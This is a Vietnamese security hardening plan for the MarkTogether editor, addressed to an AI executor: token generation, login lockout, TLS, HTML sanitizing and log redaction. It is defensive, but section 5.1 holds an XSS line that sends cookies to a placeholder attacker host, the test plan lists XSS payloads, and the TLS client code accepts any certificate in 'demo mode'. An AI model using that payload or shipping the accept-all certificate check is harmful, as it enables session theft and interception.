# SECURITY_IMPLEMENTATION_PLAN.md

> Kế hoạch nâng cấp bảo mật cho MarkTogether — viết cho AI executor thực thi tuần tự.
> Mỗi task = 1 đơn vị commit độc lập, không phá backward compatibility, không refactor lan man.

---

## 0. Bối cảnh (bắt buộc đọc trước khi sửa bất kỳ task nào)

- Đã đọc trước: `DOCUMENTATION.md` mục **11. Authentication & Security** (dòng 1003–1083).
- Hiện trạng bảo mật được tự nhận trong docs:
  - BCrypt workFactor=12 cho password ✅
  - Dapper parameterized query ✅
  - RBAC tập trung `DocumentPermissionService` ✅
  - DPAPI cho AI key phía client ✅
  - **TCP plaintext — không TLS** ❌ (docs mục 11.6)
  - **Session token = `Guid.NewGuid()`** ⚠️ (docs mục 11.7)
  - **Không rate-limit login** ⚠️ (docs mục 11.7)
  - **Markdig `UseAdvancedExtensions` cho phép raw HTML** ⚠️ (docs mục 11.5)

- **Phạm vi cấm sửa** (tuyệt đối không đụng vào nếu task không yêu cầu):
  - OT engine (`MarkTogether.Server/OT/*`)
  - Repository / DB schema / migration SQL
  - UI form (`*.Designer.cs`, layout WinForms)
  - Logic AI / Markdown render pipeline
  - Packet/MessageType enum (giao thức wire)

- **Nguyên tắc:**
  - Mỗi task chỉ chạm các file trong "Files affected".
  - Không đổi chữ ký public method ngoài chỗ được nêu rõ.
  - Không thêm dependency NuGet trừ khi task ghi rõ tên package.
  - Sau mỗi task, build solution `Debug` và `Release`, đảm bảo 0 error.
  - Sau mỗi task, ghi log thực hiện vào cuối file này ở section "11. Implementation log".

---

## 1. Thứ tự thực hiện

| # | Task | Rủi ro | Effort | Bắt buộc |
|---|------|--------|--------|----------|
| T1 | Session token dùng CSPRNG | Thấp | XS | ✅ |
| T2 | Rate-limit login + audit failed attempts | Thấp | S | ✅ |
| T3 | TLS qua `SslStream` (self-signed cert) | Trung | M | ✅ |
| T4 | Markdown sanitize raw HTML (chống XSS) | Thấp | S | ⚠️ Optional |
| T5 | Bỏ AI API key khỏi packet (hardening) | Thấp | S | ⚠️ Optional |

> AI executor: **làm tuần tự T1 → T2 → T3**. T4/T5 chỉ làm khi user xác nhận.

---

## 2. Task T1 — Session token dùng CSPRNG

### 2.1. Nguyên nhân gốc

`AuthService.GenerateToken()` (file `MarkTogether.Server/Services/AuthService.cs:103–106`) dùng `Guid.NewGuid().ToString("N")`. `Guid.NewGuid()` có entropy 122 bit và **không** được Microsoft document là CSPRNG-safe cho security token. Trong khi đó project đã có sẵn `SecureTokenGenerator.cs` dùng `RandomNumberGenerator.Create()` (đúng chuẩn) — chỉ cần tái sử dụng.

### 2.2. Files affected

- `MarkTogether.Server/Services/AuthService.cs` — sửa `GenerateToken()`.

### 2.3. Cách sửa (minimal)

Trong `AuthService.cs`:

```csharp
private static string GenerateToken()
{
    // Trước: return Guid.NewGuid().ToString("N");
    return SecureTokenGenerator.GenerateUrlSafeToken(48); // CSPRNG, 48 ký tự url-safe
}
```

### 2.4. Kiểm tra backward compatibility

- Token format vẫn là `string` ≤ 64 ký tự → khớp với cấu trúc `Packet.Token` (string không giới hạn) và `SessionManager._sessions` (`ConcurrentDictionary<string,int>`).
- Token cũ trong RAM (nếu server đang chạy) sẽ vẫn hợp lệ vì chỉ là key dictionary. Sau restart, mọi user phải login lại — đây là behaviour bình thường (mục 11.3 của docs).
- Client không phải sửa: chỉ lưu chuỗi token nhận được từ `AUTH_RESPONSE.Token` và gửi lại trong field `Packet.Token`.

### 2.5. Test plan

1. Build solution → 0 error.
2. Chạy server local. Register user mới → console log `[Auth] Đăng ký thành công`.
3. Kiểm token trả về trong `AUTH_RESPONSE.Token`: phải là 48 ký tự `[a-zA-Z0-9]` (không có dấu `-`).
4. Login lại → token mới, format giống.
5. Tạo doc, gửi op, save → tất cả vẫn xác thực OK (chứng minh `SessionManager.GetUserId(token)` vẫn hoạt động).

### 2.6. Log expected

Không thêm log mới. Behaviour console giống như trước.

---

## 3. Task T2 — Rate-limit login + audit failed attempts

### 3.1. Nguyên nhân gốc

`AuthService.Login()` không có cooldown sau N lần sai. Một attacker có thể brute force password offline-equivalent qua TCP (tốc độ bị giới hạn bởi BCrypt workFactor=12 ≈ 4 attempts/sec/core, vẫn nguy hiểm cho password yếu).

### 3.2. Files affected

- `MarkTogether.Server/Services/AuthService.cs` — thêm tracking + cooldown.

### 3.3. Cách sửa (minimal, không thêm dependency)

Trong `AuthService.cs`:

```csharp
// Thêm field static (đặt đầu class):
private static readonly System.Collections.Concurrent.ConcurrentDictionary<string, (int FailCount, DateTime LockUntilUtc)> _loginFails
    = new System.Collections.Concurrent.ConcurrentDictionary<string, (int, DateTime)>();

private const int MaxFailBeforeLock = 5;
private static readonly TimeSpan LockoutDuration = TimeSpan.FromMinutes(15);
```

Trong `Login(username, password)`, ngay sau bước "1. Validate input":

```csharp
string key = (username ?? "").Trim().ToLowerInvariant();

if (_loginFails.TryGetValue(key, out var entry) && entry.LockUntilUtc > DateTime.UtcNow)
{
    var remain = (int)Math.Ceiling((entry.LockUntilUtc - DateTime.UtcNow).TotalSeconds);
    Console.WriteLine($"[Auth] Locked login attempt: user={key} remaining={remain}s");
    return new Payload_AUTH_RESPONSE
    {
        Success = false,
        Message = $"Tài khoản tạm bị khoá. Thử lại sau {remain} giây."
    };
}
```

Khi `BCrypt.Verify` trả `false`:

```csharp
var updated = _loginFails.AddOrUpdate(key,
    _ => (1, DateTime.MinValue),
    (_, prev) =>
    {
        int c = prev.FailCount + 1;
        DateTime until = c >= MaxFailBeforeLock ? DateTime.UtcNow.Add(LockoutDuration) : DateTime.MinValue;
        return (c, until);
    });
Console.WriteLine($"[Auth] Login failed user={key} count={updated.FailCount}");
return new Payload_AUTH_RESPONSE { Success = false, Message = "Mật khẩu không đúng" };
```

Khi login thành công, **clear** entry:

```csharp
_loginFails.TryRemove(key, out _);
```

### 3.4. Ràng buộc

- Không log password.
- Key là username lowercased — không thuê IP để tránh phụ thuộc transport (TLS sẽ làm sau ở T3).
- Lockout `in-memory`, mất khi server restart — chấp nhận được vì BCrypt đã chậm sẵn.
- Không phá schema DB (không cần migration).

### 3.5. Test plan

1. Build → 0 error.
2. Login sai 5 lần liên tiếp với user `test1` → lần thứ 6 trả `"Tài khoản tạm bị khoá. Thử lại sau ..."`.
3. Login đúng với user `test2` → vẫn OK (lockout per-user).
4. Sau 15 phút (hoặc tạm chỉnh `LockoutDuration = TimeSpan.FromSeconds(10)` để test) → login lại OK.
5. Login đúng giữa chừng → counter reset (xác nhận bằng cách sai 4 lần, đúng 1 lần, sai 5 lần lại → lock).

### 3.6. Log expected

```
[Auth] Login failed user=alice count=1
[Auth] Login failed user=alice count=2
...
[Auth] Locked login attempt: user=alice remaining=895s
```

---

## 4. Task T3 — TLS qua `SslStream`

### 4.1. Nguyên nhân gốc

`PacketHelper.Send/Receive` (`MarkTogether.Shared/PacketHelper.cs`) ghi/đọc raw `NetworkStream`. Toàn bộ traffic — password lúc login, session token, nội dung doc, chat, AI API key — đều plaintext qua TCP. Mục 11.6 của docs đã nhận biết và gợi ý "stunnel hoặc Nginx stream". Task này implement TLS trong code để không phụ thuộc reverse proxy.

### 4.2. Files affected (chỉ 5 file)

1. `MarkTogether.Shared/PacketHelper.cs` — đổi type tham số từ `NetworkStream` → `Stream`.
2. `MarkTogether.Server/Network/ClientHandler.cs` — `_stream` đổi type, wrap bằng `SslStream`.
3. `MarkTogether.Server/Network/SocketServer.cs` — load cert pfx khi khởi động.
4. `MarkTogether.Client/Network/SocketClient.cs` — wrap `_stream` bằng `SslStream` sau khi `Connect`.
5. `MarkTogether.Server/App.config` + `MarkTogether.Client/server.config` — thêm config cert.

### 4.3. Bước 1 — Đổi `PacketHelper` chấp nhận `Stream`

Trong `MarkTogether.Shared/PacketHelper.cs`:

```csharp
// Trước: public static void Send(NetworkStream stream, Packet packet)
// Sau:
public static void Send(Stream stream, Packet packet) { ... }

// Tương tự Receive(Stream stream)
// ReadExact(Stream stream, byte[] buf, int n)
```

Đổi `ConditionalWeakTable<NetworkStream, object>` → `ConditionalWeakTable<Stream, object>`. Mọi lock per-stream vẫn đúng vì `SslStream` cũng là `Stream` object cố định per-connection.

`SslStream.Read` có thể trả `0` khi peer đóng — `ReadExact` đã handle (throw `IOException("Connection closed")`).

### 4.4. Bước 2 — Server side: cert + SslStream

Trong `SocketServer.cs`, thêm field:

```csharp
private readonly System.Security.Cryptography.X509Certificates.X509Certificate2 _serverCert;

public SocketServer(int port, System.Security.Cryptography.X509Certificates.X509Certificate2 cert)
{
    _port = port;
    _serverCert = cert;
}
```

Trong `StartAsync`, sau `AcceptTcpClientAsync`:

```csharp
TcpClient tcpClient = await _listener.AcceptTcpClientAsync();
// Truyền cert vào handler (KHÔNG handshake ở đây để không block accept loop)
var handler = new ClientHandler(tcpClient, _serverCert);
```

Trong `ClientHandler.cs`, sửa constructor:

```csharp
private readonly System.IO.Stream _stream; // đổi từ NetworkStream
private readonly System.Security.Cryptography.X509Certificates.X509Certificate2 _serverCert;

public ClientHandler(TcpClient tcpClient, System.Security.Cryptography.X509Certificates.X509Certificate2 serverCert)
{
    _tcpClient = tcpClient;
    _serverCert = serverCert;

    var ssl = new System.Net.Security.SslStream(tcpClient.GetStream(), leaveInnerStreamOpen: false);
    // Blocking handshake trên thread của handler (chấp nhận được, handler chạy Task.Run riêng)
    ssl.AuthenticateAsServer(
        serverCert,
        clientCertificateRequired: false,
        enabledSslProtocols: System.Security.Authentication.SslProtocols.Tls12,
        checkCertificateRevocation: false);
    _stream = ssl;
}
```

Trong `Program.cs` (server), nạp cert:

```csharp
string certPath = System.Configuration.ConfigurationManager.AppSettings["TlsCertPath"]; // ví dụ "certs/marktogether.pfx"
string certPass = System.Configuration.ConfigurationManager.AppSettings["TlsCertPassword"];
var cert = new System.Security.Cryptography.X509Certificates.X509Certificate2(certPath, certPass);
var server = new SocketServer(port, cert);
```

### 4.5. Bước 3 — Client side: SslStream wrap

Trong `SocketClient.Connect`:

```csharp
_tcp = new TcpClient();
_tcp.Connect(host, port);

var ssl = new System.Net.Security.SslStream(
    _tcp.GetStream(),
    leaveInnerStreamOpen: false,
    userCertificateValidationCallback: (sender, certificate, chain, errors) =>
    {
        // Dev/demo: chấp nhận self-signed.
        // Production: pin SHA-256 hash đọc từ server.config.
        string expectedThumb = LoadExpectedCertThumb();
        if (string.IsNullOrEmpty(expectedThumb)) return true; // demo mode
        return certificate != null
            && string.Equals(certificate.GetCertHashString(), expectedThumb, StringComparison.OrdinalIgnoreCase);
    });

ssl.AuthenticateAsClient(host, null, System.Security.Authentication.SslProtocols.Tls12, false);
_stream = ssl;
```

Đổi type `_stream` từ `NetworkStream` → `Stream`.

### 4.6. Bước 4 — Sinh cert self-signed (1 lần, không commit)

AI executor in hướng dẫn cho user chạy thủ công (vì sinh cert là thao tác one-off, không thuộc code path):

```powershell
# Trên Windows PowerShell với quyền admin
$cert = New-SelfSignedCertificate `
    -DnsName "marktogether.local","localhost" `
    -CertStoreLocation "Cert:\CurrentUser\My" `
    -NotAfter (Get-Date).AddYears(5) `
    -KeyAlgorithm RSA -KeyLength 2048

$pwd = ConvertTo-SecureString -String "ChangeMe-DEV" -Force -AsPlainText
Export-PfxCertificate -Cert $cert -FilePath "marktogether.pfx" -Password $pwd

# Lấy thumbprint cho client pin
$cert.Thumbprint
```

Cập nhật:

- `MarkTogether.Server/App.config` thêm:
  ```xml
  <add key="TlsCertPath" value="marktogether.pfx" />
  <add key="TlsCertPassword" value="ChangeMe-DEV" />
  ```
- `MarkTogether.Client/server.config` thêm dòng:
  ```
  CERT_THUMB=<thumbprint hex>
  ```
- `.gitignore` thêm `*.pfx` để tránh commit.

### 4.7. Ràng buộc / lưu ý

- TLS 1.2 cố định để Mono trên Linux (production VPS) hỗ trợ ổn định.
- Không bật mutual TLS (client cert) — phức tạp, không cần thiết cho đồ án.
- `leaveInnerStreamOpen: false` → khi `SslStream.Dispose`, inner `NetworkStream` đóng theo, an toàn.
- `Disconnect()` ở client phải đóng `_stream` (SslStream) — code hiện đã `_stream?.Close()` nên không cần sửa.
- Performance: TLS 1.2 handshake thêm ~1 RTT. Không ảnh hưởng OT (sau handshake là encrypted-passthrough, throughput gần bằng plain TCP).

### 4.8. Test plan

1. Sinh cert, copy `.pfx` vào thư mục `bin/Debug/` của Server.
2. Build → 0 error.
3. Chạy server → log `[Server] Đang lắng nghe trên port 5000...`.
4. Chạy client → login → vẫn vào HomeForm bình thường.
5. **Quan sát Wireshark / `tshark -i lo -f "port 5000"`**: không thấy chuỗi `"AUTH_LOGIN"` hay password plaintext, chỉ thấy TLS application data.
6. Test 2 client cùng doc → OT broadcast hoạt động.
7. Disconnect / reconnect → handshake mới OK, không leak.
8. Cố tình đổi `CERT_THUMB` ở client config → `AuthenticateAsClient` throw `AuthenticationException` → đóng kết nối gọn, không crash.

### 4.9. Log expected

Không thêm log mới ngoài exception khi handshake fail:

```
[Handler] SendSafe failed for user X: The remote certificate is invalid
```

---

## 5. Task T4 — Markdown sanitize raw HTML (OPTIONAL)

### 5.1. Nguyên nhân gốc

`TypeRenderForm` render preview qua Markdig với `UseAdvancedExtensions`. Nếu user nhập `<script>fetch('http://attacker/?c='+document.cookie)</script>`, WebView2 có thể thực thi. Hiện tại risk thấp vì doc chỉ chia sẻ trong nhóm tin cậy, nhưng `visibility=public` + sharing link công khai khiến vector tồn tại.

### 5.2. Files affected

- `MarkTogether.Client/TypeRenderForm.cs` — chỗ build HTML preview.
- (Không thêm NuGet) Tự viết regex strip `<script>` / `<iframe>` / `on*=` attr trước khi NavigateToString.

### 5.3. Cách sửa (minimal, không thêm dependency)

Trước khi gọi `webPreview.NavigateToString(htmlBody)` (hoặc `window.updatePreviewFromBase64`), thêm 1 hàm `SanitizeHtml`:

```csharp
private static string SanitizeHtml(string html)
{
    if (string.IsNullOrEmpty(html)) return html;
    // Bỏ script / iframe / object / embed
    html = System.Text.RegularExpressions.Regex.Replace(
        html, @"<\s*(script|iframe|object|embed)\b[^>]*>.*?<\s*/\s*\1\s*>",
        "", System.Text.RegularExpressions.RegexOptions.IgnoreCase | System.Text.RegularExpressions.RegexOptions.Singleline);
    html = System.Text.RegularExpressions.Regex.Replace(
        html, @"<\s*(script|iframe|object|embed)\b[^>]*/?>",
        "", System.Text.RegularExpressions.RegexOptions.IgnoreCase);
    // Bỏ inline event handler (onclick, onerror, ...)
    html = System.Text.RegularExpressions.Regex.Replace(
        html, @"\son\w+\s*=\s*(""[^""]*""|'[^']*'|[^\s>]+)",
        "", System.Text.RegularExpressions.RegexOptions.IgnoreCase);
    // Bỏ javascript: URI
    html = System.Text.RegularExpressions.Regex.Replace(
        html, @"javascript\s*:",
        "blocked:", System.Text.RegularExpressions.RegexOptions.IgnoreCase);
    return html;
}
```

> **Lưu ý:** Regex sanitizer là defense-in-depth, **không** thay thế HtmlSanitizer chuyên dụng. Nếu sau này cần level cao hơn, cài NuGet `HtmlSanitizer` của Vladimir Nul. Task này cố ý tránh thêm dependency.

### 5.4. Test plan

1. Tạo doc với nội dung:
   ```
   # Test
   <script>alert('xss')</script>
   <img src=x onerror="alert(1)">
   [evil](javascript:alert(1))
   ```
2. Preview phải hiển thị text/img nhưng KHÔNG alert.
3. Markdown thông thường (`**bold**`, code block, table) vẫn render bình thường.

---

## 6. Task T5 — Bỏ AI API key khỏi packet (OPTIONAL)

### 6.1. Nguyên nhân gốc

Hiện `Payload_AI_Request` chứa `apiKey` (string). Sau khi có TLS (T3) thì key đã được mã hoá đường truyền, nhưng vẫn nằm trong RAM server + có thể bị log nếu ai đó vô tình log full packet.

### 6.2. Cách sửa khả thi nhất (KHÔNG phá protocol)

Giữ nguyên field `apiKey` trong `Payload_AI_Request`, nhưng:

- Server **không log** field này (đã đúng — log `keyHash` 8 hex theo docs).
- Thêm assert: nếu `apiKey != null && Logger debug enabled`, redact `"***"`.
- Phương án nâng cấp lớn hơn (gọi Gemini trực tiếp từ client) → phá kiến trúc, **không thuộc plan này**.

### 6.3. Files affected

- `MarkTogether.Server/Network/ClientHandler.cs` — `HandleAiRequest`: đảm bảo không có `Console.WriteLine` chứa raw `payload.apiKey`. Audit code, sửa nếu phát hiện.

### 6.4. Test plan

1. Bật AI, gửi 1 request.
2. `Select-String -Path "MarkTogether.Server\bin\Debug\*.log" -Pattern "apiKey"` → phải không trả về plaintext key.

---

## 7. Sau khi xong T1–T3

1. Cập nhật `DOCUMENTATION.md` mục **11.7. Điểm yếu đã biết**:
   - Gạch bỏ "Token chỉ là Guid" → ghi "✅ Đã dùng CSPRNG token (xem SecureTokenGenerator)".
   - Gạch bỏ "Không rate-limit login" → ghi "✅ 5 lần sai → lock 15 phút".
   - Gạch bỏ "TCP plaintext" trong mục 11.6 → ghi "✅ TLS 1.2 mặc định, cert pin client-side".

2. Update README/section deploy nếu có hướng dẫn tạo cert.

---

## 8. Quy trình build & verify chung (sau MỖI task)

```powershell
# Build
& "C:\Program Files\Microsoft Visual Studio\18\Community\MSBuild\Current\Bin\MSBuild.exe" `
    MarkTogether.sln /p:Configuration=Debug /t:Rebuild

# Smoke test
.\MarkTogether.Server\bin\Debug\MarkTogether.Server.exe
# (mở 1 cửa sổ khác)
.\MarkTogether.Client\bin\Debug\MarkTogether.Client.exe
```

Tiêu chí pass:
- 0 build error, 0 build warning mới phát sinh do task.
- Server khởi động được, accept client.
- Login / tạo doc / gõ OT realtime / save → vẫn xanh.

---

## 9. Cấm thay đổi (re-emphasize)

- ❌ Không refactor `OTEngine`, `DocumentState`, `DocumentStateManager`.
- ❌ Không sửa SQL schema.
- ❌ Không đổi `MessageType` enum / `Packet` class.
- ❌ Không format lại file (no whitespace-only diff).
- ❌ Không rename biến public.
- ❌ Không thêm NuGet ngoài danh sách (T3 chỉ dùng `System.Net.Security` có sẵn .NET 4.7.2).
- ❌ Không đụng UI (`*.Designer.cs`).

---

## 10. Logging policy

- Không log: password, raw API key, full packet JSON.
- Được phép log: username (lower), userId, action name, exception message, duration ms, count.
- Format: `[Component] action key=value key=value`.
- Tất cả log dùng `Console.WriteLine` (giữ pattern hiện tại của server).

---

## 11. Implementation log

> AI executor: thêm 1 block sau mỗi task hoàn thành.

```
### T1 — 2026-05-22
- Files modified: MarkTogether.Server/Services/AuthService.cs
- Root cause: GUID không phải CSPRNG security token chính danh.
- Fix: Thay GenerateToken() bằng SecureTokenGenerator.GenerateUrlSafeToken(48).
- Test: build Debug/Release (xem kết quả executor).
- Side effects: token mới dài 48 ký tự, client không cần đổi.
```

```
### T2 — 2026-05-22
- Files modified: MarkTogether.Server/Services/AuthService.cs
- Root cause: AuthService.Login() không cooldown sau nhiều lần sai password.
- Fix: Thêm ConcurrentDictionary in-memory theo username lower-case; 5 lần sai khóa 15 phút; login đúng clear counter; không log password.
- Test: build Debug/Release (xem kết quả executor).
- Side effects: lockout mất khi server restart, đúng phạm vi plan.
```

```
### T3 — 2026-05-22
- Files modified: MarkTogether.Shared/PacketHelper.cs, MarkTogether.Server/Network/ClientHandler.cs, MarkTogether.Server/Network/SocketServer.cs, MarkTogether.Server/Program.cs, MarkTogether.Client/Network/SocketClient.cs, MarkTogether.Server/App.config, MarkTogether.Client/server.config, DOCUMENTATION.md
- Root cause: PacketHelper đọc/ghi trực tiếp NetworkStream plaintext.
- Fix: PacketHelper nhận Stream; server wrap connection bằng SslStream TLS 1.2 với PFX từ App.config; client wrap SslStream và hỗ trợ CERT_THUMB pinning.
- Test: build Debug/Release (xem kết quả executor).
- Side effects: cần tạo/copy marktogether.pfx vào output server trước khi chạy.
```

---

**Hết kế hoạch. Bắt đầu từ T1.**
